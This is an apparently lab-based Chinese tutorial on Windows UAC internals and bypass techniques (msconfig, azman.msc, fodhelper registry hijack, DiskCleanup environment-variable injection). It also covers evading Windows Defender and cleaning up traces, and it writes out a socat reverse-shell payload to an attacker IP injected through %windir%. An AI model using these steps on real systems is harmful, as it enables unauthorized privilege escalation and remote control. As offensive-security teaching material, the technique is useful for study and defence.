## 0x00 前言

这篇文章可以带大家了解UAC认证机制和如何Bypass UAC。

## 0x01 用户帐户控制 (UAC)

###  **什么是 UAC？**

用户帐户控制 (UAC) 是一项 Windows 安全功能， **默认情况下强制任何新进程在非特权帐户的安全中运行。**
此策略适用于任何用户（包括管理员自己）启动的进程。

这个想法是，我们不能仅仅依靠用户的身份来确定是否应该授权某些操作。

但想象一下用户 user 在不知不觉中从 Internet 下载恶意应用程序的情况。如果 user
是管理员组的一部分，那么他启动的任何应用程序都将继承其访问令牌权限。因此，如果 user 决定启动恶意应用程序并禁用
UAC，恶意应用程序将立即获得管理员权限。相反，当启用 UAC 时，恶意应用程序将被限制为非管理访问令牌。

  * #####  **UAC Elevation**

如果管理员需要执行特权任务，UAC 提供了一种提升特权的方法。 **Elevation**
通过向用户显示一个简单的对话框来确认他们明确批准在管理安全中运行应用程序来工作

  * #####  **完整性等级**

UAC 是一种 **强制完整性控制** **(MIC)** ，它是一种通过为每个用户、进程和资源分配一个 **完整性级别** **(IL)**
来区分用户、进程和资源的机制。一般而言，具有较高 IL 访问令牌的用户或进程将能够访问具有较低或相等 IL 的资源。MIC 优先于常规 Windows
DACL，因此您可能有权根据 DACL 访问资源，但如果您的 IL 不够高也没关系。

Windows 使用以下 4 个 IL，从低到高排序：

 **Integrity Level**

|

 **Use**  
  
---|---  
  
Low

|

一般用于与 Internet 交互（即 Internet Explorer）。权限非常有限。  
  
Medium

|

分配给标准用户和管理员的过滤令牌。  
  
High

|

如果启用了 UAC，则由管理员的提升令牌使用。如果 UAC 被禁用，所有管理员将始终使用高 IL 令牌。  
  
System

|

保留供系统使用。  
  
当进程需要访问资源时，它将继承调用用户的访问令牌及其关联的 IL。 如果一个进程分叉一个子进程，也会发生同样的情况。

  * #####  **Filtered Tokens**

为了实现这种角色分离，UAC 在登录期间以稍微不同的方式对待普通用户和管理员：

  1. 非管理员在登录时将收到一个访问令牌，该令牌将用于用户执行的所有任务。此令牌具有中等IL。

  2. 管理员

将收到两个访问令牌：

 **Filtered Token** **：** 去除了管理员权限的令牌，用于常规操作。此令牌具有中等 IL。

 **提升令牌：** 具有完全管理员权限的令牌，在需要以管理权限运行某些东西时使用。此令牌具有高 IL。

这样，管理员将使用他们过滤的令牌，除非他们通过 UAC 明确请求管理权限。

  * #####  **通常方式打开应用程序**

尝试打开常规控制台时，我们可以以非特权用户或管理员身份打开它。根据我们的选择，中或高完整性级别的令牌将分配给生成的进程

![](https://image.3001.net/images/20220510/1652147738_6279c61a5b9ecdb13ccb4.png!small)

如果我们使用 Process Hacker 分析这两个进程，我们可以看到相关的令牌及其差异：

![](https://image.3001.net/images/20220510/1652147771_6279c63b0ffef3c8d71c5.png!small)

在左侧，您有一个过滤后的令牌，具有中等 IL，几乎没有分配任何权限。在右侧，您可以看到该进程以高 IL
运行并具有更多可用权限。另一个可能不那么明显的区别是，中等 IL 进程实际上被拒绝了与成为管理员组成员相关的任何特权。

###  **UAC 设置**

根据我们的安全要求，可以将 UAC 配置为在四个不同的通知级别上运行：

 **始终通知：** 在更改 Windows 设置或程序尝试安装应用程序或更改计算机时通知并提示用户授权。

 **仅当程序尝试对我的计算机进行更改时通知我：** 当程序尝试安装应用程序或对计算机进行更改时通知并提示用户授权。更改 Windows
设置时不会提示管理员。

 **仅当程序尝试对我的计算机进行更改时通知我（不要使我的桌面变暗）：** 与上述相同，但不会在安全桌面上运行 UAC 提示。

 **从不通知：** 禁用 UAC 提示。管理员将滥用高权限令牌运行所有内容。

默认情况下， **仅当程序尝试更改我的计算机** 级别时才在通知我上配置 UAC：

![](https://image.3001.net/images/20220510/1652147792_6279c65019854ec46c3ac.png!small)

从攻击者的角度来看，三个较低的安全级别是等效的，只有始终通知设置存在差异。

###  **UAC 内部结构**

UAC 的核心是 **应用程序信息服务** 或 **Appinfo** 。每当用户需要提升时，都会发生以下情况：

1\. 用户请求以管理员身份运行应用程序。

2\. 使用 **runas** 动词进行 **ShellExecute** API 调用。

3\. 该请求被转发到 Appinfo 以处理提升。

4\. 检查应用程序清单以查看是否允许 AutoElevation（稍后会详细介绍）。

5\. Appinfo 执行许可.exe ，它在安全桌面上显示 UAC
提示。安全桌面只是一个单独的桌面，它将进程与实际用户桌面中运行的任何内容隔离开来，以避免其他进程以任何方式篡改 UAC 提示。

6\. 如果用户同意以管理员身份运行应用程序，Appinfo 服务将使用用户的提升令牌执行请求。然后，Appinfo 将设置新进程的父进程 ID
以指向请求提升的 shell。

![](https://image.3001.net/images/20220510/1652147814_6279c6665f964270c1f4e.png!small)

###  **绕过 UAC**

从攻击者的角度来看，您可能会通过 Powershell 或 cmd.exe 获取 Windows 主机的远程
shell。您甚至可以通过属于管理员组的帐户获得访问权限，但是当您尝试创建后门用户以供将来访问时，您会收到以下错误：

![](https://image.3001.net/images/20220510/1652147831_6279c67743611bbf1b4a7.png!small)

通过检查我们分配的组，我们可以确认我们的会话正在使用中等 IL 运行，这意味着我们有效地使用了过滤令牌

![](https://image.3001.net/images/20220510/1652147845_6279c68583f544e429896.png!small)

即使我们获得与管理用户的 Powershell 会话，UAC
也会阻止我们执行任何管理任务，因为我们目前仅使用过滤令牌。如果我们想完全控制我们的目标，我们必须绕过 UAC。

微软并未将 UAC 视为安全边界，而是为管理员提供了一种简单的便利，以避免不必要地以管理权限运行进程。从这个意义上说，UAC
提示更多的是提醒用户他们正在以高权限运行，而不是阻止恶意软件或攻击者这样做。由于它不是安全边界，因此任何绕过技术都不会被视为 Microsoft
的漏洞，因此其中一些至今仍未修补。

一般来说，大多数绕过技术都依赖于我们能够利用高 IL 进程代表我们执行某些操作。由于由 High IL
父进程创建的任何进程都将继承相同的完整性级别，因此这足以获得提升的令牌，而无需我们通过 UAC 提示。

## 0x02 UAC：基于 GUI 的绕过

###  **案例研究：msconfig**

我们的目标是在不通过 UAC 的情况下获得对 High IL 命令提示符的访问。首先，让我们从开始菜单或“运行”对话框打开 msconfig

![](https://image.3001.net/images/20220510/1652147884_6279c6ac7c3839496cb7f.png!small)

我们使用 Process Hacker分析 msconfig 进程，就会发现一些有趣的东西。即使没有向我们提供 UAC 提示，msconfig 也会作为高
IL 进程运行：

![](https://image.3001.net/images/20220510/1652147901_6279c6bd3b4072ecddb6b.png!small)

这要归功于一种称为自动提升的功能，它允许特定的二进制文件在不需要用户交互的情况下提升。

如果我们可以强制 msconfig 为我们生成一个 shell，shell 将继承 msconfig 使用的相同访问令牌，因此作为高 IL
进程运行。通过导航到“工具”选项卡，我们可以找到执行此操作的选项：

![](https://image.3001.net/images/20220510/1652147943_6279c6e7ec32dc9d7141c.png!small)

如果我们点击 启动，我们将获得一个高 IL 命令提示符，而无需以任何方式与 UAC 交互。

###  **案例研究：azman.msc**

与 msconfig 一样，azman.msc 将自动提升而不需要用户交互。如果我们能找到从该进程中生成 shell 的方法，我们将绕过 UAC。请注意，与
msconfig 不同，azman.msc 没有预期的内置方式来生成 shell。我们可以通过一点创造力轻松克服这一点。

首先，让我们运行 azman.msc

![](https://image.3001.net/images/20220510/1652147959_6279c6f7ef555344454e7.png!small)

我们可以确认使用 Process Hacker 生成了一个具有高 IL 的进程。请注意，所有 .msc 文件都是从 mmc.exe（Microsoft
管理控制台）运行的：

![](https://image.3001.net/images/20220510/1652148006_6279c72630fee89848bbd.png!small)

要运行 shell，我们将使用应用程序的帮助：

![](https://image.3001.net/images/20220510/1652148024_6279c738c845b47a0ecf4.png!small)

在帮助屏幕上，我们将右键单击帮助文章的任何部分并选择查看源文件：

![](https://image.3001.net/images/20220510/1652148088_6279c778af59d416f7a64.png!small)

这将产生一个记事本进程，我们可以利用它来获取 shell。为此，请转到 **文件** **- >** **打开** 并确保在右下角的组合框中选择
**所有文件。** 去C:\Windows\System32并搜索cmd.exe并右键单击选择打开：

![](https://image.3001.net/images/20220510/1652148142_6279c7ae0280b47f883e3.png!small)

这将再次绕过 UAC 并让我们访问高完整性命令提示符。您可以检查 Process Hacker 中的进程树，以了解高完整性令牌如何从
mmc（Microsoft 管理控制台，通过 Azman 启动）传递到 cmd.exe：

![](https://image.3001.net/images/20220510/1652148192_6279c7e0ed3ad519cb1ca.png!small)

## 0x03 UAC：自动提升流程

###  **自动提升**

一些可执行文件可以自动提升，无需任何用户干预即可实现高 IL。这适用于控制面板的大部分功能和随 Windows 提供的一些可执行文件。

对于应用程序，需要满足一些要求才能自动提升：

可执行文件必须由 Windows Publisher 签名

可执行文件必须包含在受信任的目录中，例如%SystemRoot%/System32/要么%ProgramFiles%/

根据应用程序的类型，可能适用其他要求：

可执行文件 (.exe) 必须在其清单中声明 **autoElevate** 元素。要检查文件的清单，我们可以使用 **sigcheck** ，这是作为
Sysinternals 套件的一部分提供的工具。如果我们检查 msconfig.exe 的清单，我们会发现 autoElevate 属性：

![](https://image.3001.net/images/20220510/1652148210_6279c7f2c6d47439be2a9.png!small)

mmc.exe 将根据用户请求的 .msc 管理单元自动提升。Windows 中包含的大多数 .msc 文件都会自动提升。

Windows 会保留一个附加的可执行文件列表，即使在清单中没有请求时也会自动提升。例如，此列表包括pkgmgr.exe 和 spinstall.exe。

COM 对象还可以通过配置一些注册表项（https://docs.microsoft.com/en-us/windows/win32/com/the-com-elevation-moniker）来请求自动提升。

###  **案例研究：Fodhelper**

Fodhelper.exe 是 Windows 默认可执行文件之一，负责管理 Windows
可选功能，包括其他语言、默认未安装的应用程序或其他操作系统特性。与大多数用于系统配置的程序一样，fodhelper 可以在使用默认 UAC
设置时自动提升，以便在执行标准管理任务时不会提示管理员提升。虽然我们已经查看了 autoElevate 可执行文件，但与 msconfig
不同的是，fodhelper 可以在无法访问 GUI 的情况下被滥用。

![](https://image.3001.net/images/20220510/1652148224_6279c800c2faffc67d2ed.png!small)

![](https://image.3001.net/images/20220510/1652148234_6279c80a4b8397d9e85d0.png!small)

从攻击者的角度来看，这意味着它可以通过中等完整性远程 shell 使用，并被利用到功能齐全的高完整性进程中。

关于 fodhelper 的值得注意的是，它会在注册表中搜索感兴趣的特定键：

![](https://image.3001.net/images/20220510/1652148246_6279c8169ce0466658828.png!small)

当 Windows 打开文件时，它会检查注册表以了解要使用的应用程序。注册表为每个文件类型保存一个称为 Programmatic ID (
**ProgID** ) 的键，与相应的应用程序相关联。假设您尝试打开一个 HTML 文件。将检查称为 **HKEY_CLASSES_ROOT**
的注册表部分，以便系统知道它必须使用您首选的 Web 客户端才能打开它。要使用的命令将在shell/open/command每个文件的 ProgID
的子键。以“htmlfile”ProgID 为例：

![](https://image.3001.net/images/20220510/1652148258_6279c822d09c00c7eb93c.png!small)

实际上，HKEY_CLASSES_ROOT 只是注册表中两个不同路径的合并视图：

 **Path**

|

 **Description**  
  
---|---  
  
HKEY_LOCAL_MACHINE\Software\Classes

|

系统范围的文件关联  
  
HKEY_CURRENT_USER\Software\Classes

|

活动用户的文件关联  
  
检查 HKEY_CLASSES_ROOT 时，如果 **HKEY_CURRENT_USER (HKCU)** **存在用户特定关联**
，则优先。如果未配置用户特定关联，则将使用 **HKEY_LOCAL_MACHINE (HKLM)** **处的系统范围关联**
。这样，每个用户都可以根据需要单独选择他们喜欢的应用程序。

回到 fodhelper，我们现在看到它正在尝试打开 ms-settings ProgID 下的文件。通过在 HKCU 下的当前用户中为该 ProgID
创建关联，我们将覆盖默认的系统范围关联，从而控制使用哪个命令打开文件。由于 fodhelper 是一个 autoElevate
可执行文件，它产生的任何子进程都将继承一个高完整性令牌，从而有效地绕过 UAC。

我们在目标服务器上植入了后门。想设法在管理员组中创建了一个帐户，但 UAC 阻止了任何特权任务的执行。要检索标志，他需要您绕过 UAC 并获得功能齐全的高
IL shell。

连接后门以后，我们检查我们的用户是否属于 Administrators 组，并且它是否使用中等完整性令牌运行：

![](https://image.3001.net/images/20220510/1652148276_6279c8340eecc883643a7.png!small)

我们设置所需的注册表值以将 ms-settings 类与反向 shell 相关联。您可以使用以下命令从标准命令行设置所需的注册表项：

![](https://image.3001.net/images/20220510/1652148286_6279c83eb6c6219d2c7c7.png!small)

![](https://image.3001.net/images/20220510/1652148293_6279c8456cbe672c5775a.png!small)

为了避免被检测到，我们需要在自己之后使用以下命令进行清理：

![](https://image.3001.net/images/20220510/1652148307_6279c853ec5b859ce53a4.png!small)

## 0x04 改进 Fodhelper Exploit 绕过 Windows Defender

###  **负载竞争**

我们启用 Windows Defender之后再去通过后门连接再次利用 fodhelper的话会被拦截

![](https://image.3001.net/images/20220510/1652148321_6279c861e1014322aaf75.png!small)

在注册表上查询对应的值，你会发现它已经被删除了

![](https://image.3001.net/images/20220510/1652148335_6279c86f224ed6b93ca1c.png!small)

![](https://image.3001.net/images/20220510/1652148342_6279c876f1e81a776e8a7.png!small)

将有问题的注册表值设置为我们的反向 shell 所需的命令后，我们立即向它添加了一个快速查询。令人惊讶的是，查询完整地输出了我们的命令。 Windows
Defender 仍然向我们发出警报，一秒钟后，违规的注册表值按预期被删除。Windows Defender
似乎需要一些时间才能对我们的漏洞采取行动，所以让我们在攻击者的机器上设置一个反向侦听器：

![](https://image.3001.net/images/20220510/1652148355_6279c8830cfb0b2736cb5.png!small)

修改exploit在设置注册表值后立即运行fodhelper.exe。如果命令运行得足够快，它将正常工作

![](https://image.3001.net/images/20220510/1652148366_6279c88e0bb8f32c71cbf.png!small)

取决于你的运气，fodhelper 可能会在AV启动之前执行，给你一个反向
shell。如果由于某种原因它对您不起作用，请记住，这种方法是不可靠的，因为它取决于 AV 和您首先执行的有效负载之间的竞争。

###  **改进 fodhelper**

这次我们不是将有效负载写入HKCU\Software\Classes\ms-settings\Shell\Open\command，我们将使用CurVerprogID
注册表项下的条目。当您在同一系统上运行具有不同版本的应用程序的多个实例时，将使用此条目。CurVer 允许您在打开给定文件类型时指向 Windows
使用的应用程序的默认版本。

为此，我们将在注册表中为我们选择的新 progID 创建一个条目（任何名称都可以），然后将 ms-settings progID 中的 CurVer
条目指向我们新创建的 progID。这样，当 fodhelper 尝试使用 ms-settings progID 打开文件时，它会注意到 CurVer
条目指向我们的新 progID 并检查它以查看要使用的命令。

![](https://image.3001.net/images/20220510/1652148385_6279c8a1317522420bacb.png!small)

该漏洞利用创建了一个名为 **.pwn** 的新 progID，并将我们的有效负载与打开此类文件时使用的命令相关联。然后它将 ms-settings 的
CurVer 条目指向我们的 .pwn progID。当 fodhelper 尝试打开 ms-settings 程序时，它将被指向 .pwn progID
并使用其关联的命令。

![](https://image.3001.net/images/20220510/1652148399_6279c8af16d1fb7153761.png!small)

尽管我们仍然被检测到，但必须注意的是，有时AV软件使用的检测方法是严格针对已发布的漏洞实施的，而没有考虑可能的变化。如果我们将我们的漏洞利用从
Powershell 转换为使用 cmd.exe，则 AV 不会发出任何警报。

![](https://image.3001.net/images/20220510/1652148410_6279c8ba59a6082050952.png!small)

payload设置为powershell 的cs马被拦截,使用socat进行ip反弹

![](https://image.3001.net/images/20220510/1652148422_6279c8c66334d65dbc890.png!small)

我们得到了一个高完整性的反向shell：

![](https://image.3001.net/images/20220510/1652148433_6279c8d1998bda61c938a.png!small)

![](https://image.3001.net/images/20220510/1652148447_6279c8df591198f1cb4ca.png!small)

为了避免被检测到，我们需要在自己之后使用以下命令进行清理：

![](https://image.3001.net/images/20220510/1652148456_6279c8e88d60728d4d510.png!small)

## 0x05 环境变量扩展

###  **始终通知级别绕过**

在默认的 Windows 配置中，您可以滥用与系统配置相关的应用程序来绕过UAC，因为大多数这些应用程序的清单上都设置了 autoElevate
标志。但是，如果 UAC 配置为“始终通知”级别，则 fodhelper 和类似应用程序将没有任何用处，因为它们需要用户通过 UAC
提示来提升。这将阻止使用几种已知的绕过方法，但并非所有希望都消失了。

对于以下技术，我们将滥用可以由任何用户运行但将以调用者可用的最高权限执行的计划任务。计划任务是一个令人兴奋的目标。按照设计，它们旨在在没有任何用户交互的情况下运行（独立于UAC安全级别），因此要求用户手动提升进程不是一种选择。任何需要提升的计划任务都将自动获得它，而无需通过
UAC 提示。

###  **案例研究：磁盘清理计划任务**

 **注意：请务必为此任务禁用 Windows Defender** **，否则在运行漏洞利用程序时可能会遇到一些困难。**

要了解我们为什么选择磁盘清理，让我们打开 **任务计划程序** 并检查任务的配置：

![](https://image.3001.net/images/20220510/1652148469_6279c8f5f202b4d07beba.png!small)

在这里我们可以看到任务被配置为使用 **用户** 帐户运行，这意味着它将继承调用用户的权限。以 **最高权限运行**
选项将使用调用用户可用的最高权限安全令牌，这是管理员的高 IL 令牌。请注意，如果普通非管理员用户调用此任务，它将仅使用中等 IL
执行，因为这是非管理员可用的最高权限令牌，因此绕过将不起作用。

检查操作和设置选项卡，我们可以看到以下内容：

![](https://image.3001.net/images/20220510/1652148481_6279c9011efdc36ba49d0.png!small)

该任务可以按需运行，调用时执行以下命令：

    
    
    %windir%\system32\cleanmgr.exe /autoclean /d %systemdrive%

由于命令依赖于环境变量，我们可以通过它们注入命令并通过手动启动 DiskCleanup 任务来执行它们。

幸运的是，我们可以通过在注册表中创建一个条目HKCU\Environment来覆盖该变量%windir%,
如果我们想使用socat执行一个反向shell，我们可以设置 %windir%如下：

    
    
    "cmd.exe /cC:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes&REM "

在我们的命令结束时，我们连接 **“ &REM”**以注释%windir%在扩展环境变量以获取 DiskCleanup
使用的最终命令之后放置的任何内容。生成的命令将是：

    
    
    cmd.exe /cC:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes&REM \system32\cleanmgr.exe /autoclean /d %systemdrive%

“REM”之后的任何内容都被忽略为注释。

最后，运行以下命令将我们的负载写入%windir%，然后执行 DiskCleanup 任务:

![](https://image.3001.net/images/20220510/1652148498_6279c9124cf92ae0c5ef7.png!small)

![](https://image.3001.net/images/20220510/1652148506_6279c91ac7b0b80f45983.png!small)

![](https://image.3001.net/images/20220510/1652148519_6279c927160f5997c3eba.png!small)

![](https://image.3001.net/images/20220510/1652148528_6279c9301681ed0fbabdc.png!small)

为了避免被检测到，我们需要在自己之后使用以下命令进行清理：

![](https://image.3001.net/images/20220510/1652148537_6279c939e76b11a0fe5d2.png!small)

## 0x06 自动化开发

###  **自动化UAC绕过**

    
    
    https://github.com/hfiref0x/UACME

使用该工具很简单，只需要您指明与要测试的方法对应的编号。项目的 GitHub
描述中提供了完整的方法列表。如果要测试方法33，可以在命令提示符下执行以下操作，会弹出一个高完整性的cmd.exe：

![](https://image.3001.net/images/20220510/1652148550_6279c94678d137d85d06b.png!small)

  

Method Id  
  
---  
  
33  
  
34  
  
70  
  
## 0x07 结论

几种绕过Windows 系统中的UAC的方法。 **虽然这些方法中的大多数都关联了自动工具，但如果直接使用，市场上的任何 AV
解决方案都可以轻松检测到它们。**
了解实际方法将使您成为攻击者，因为您可以根据需要自定义漏洞利用并使其更具规避性。因为UAC不被视为安全边界，因此容易出现多种绕过方法。

